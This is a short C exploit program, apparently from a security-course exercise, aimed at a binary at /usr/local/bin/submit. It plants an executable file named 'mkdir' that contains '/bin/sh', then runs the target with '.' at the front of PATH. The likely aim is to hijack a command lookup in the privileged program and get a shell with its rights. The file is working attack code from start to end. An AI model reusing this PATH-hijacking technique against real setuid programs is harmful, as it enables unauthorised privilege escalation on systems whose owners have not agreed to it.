#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  int eggLength = sizeof(shellcode) + 5;
  char *args[4];
  char *env[2] = { NULL, NULL };
  FILE *fp;

  args[0] = "submit.c";
  args[1] = "file.txt";
  args[2] = "message";
  args[3] = NULL;

  fp=fopen("/share/mkdir", "w");
  fprintf(fp, "/bin/sh");
  fclose(fp);
  chmod("/share/mkdir", 0777);
  env[0] = "PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/games";
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
